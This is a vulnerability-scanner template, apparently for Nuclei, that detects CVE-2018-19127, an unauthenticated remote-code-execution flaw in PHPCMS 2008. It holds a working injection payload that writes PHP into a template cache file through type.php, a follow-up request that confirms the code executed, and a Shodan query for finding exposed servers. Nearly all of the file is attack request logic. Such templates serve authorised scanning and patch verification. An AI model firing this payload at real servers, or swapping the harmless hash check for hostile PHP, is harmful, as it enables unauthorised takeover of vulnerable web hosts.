id: CVE-2018-19127

info:
  name: PHPCMS 2008 - Remote Code Execution via Template Injection
  author: tomaquet18
  severity: critical
  description: |
    PHPCMS 2008 suffers from an unauthenticated RCE via template injection in type.php, where attacker-supplied content is written into a PHP template cache file, which is then executable.
  impact: |
    Successful exploitation allows an unauthenticated attacker to achieve remote code execution on the server, potentially taking full control.
  remediation: |
    The vendor is unresponsive and PHPCMS 2008 is no longer maintained. Users are advised to stop using this software or restrict public access to it.
  reference:
    - https://github.com/ab1gale/phpcms-2008-CVE-2018-19127
    - https://github.com/advisories/GHSA-p498-q357-m3p7
  tags: cve,phpcms,rce,template-injection,unauth

  metadata:
    max-request: 2
    shodan-query: http.html:"Powered by phpcms"
    verified: false

variables:
  payload: "tag_(){};echo(md5(123));{//../rss"

http:
  - method: GET
    path:
      - "{{BaseURL}}/type.php?template={{payload}}"

    unsafe: true
    max-redirects: 0
    stop-at-first-match: true

    matchers:
      - type: status
        internal: true
        status:
          - 200

  - method: GET
    path:
      - "{{BaseURL}}/data/cache_template/rss.tpl.php"

    unsafe: true
    max-redirects: 0
    stop-at-first-match: true

    matchers:
      - type: word
        words:
          - "202cb962ac59075b964b07152d234b70"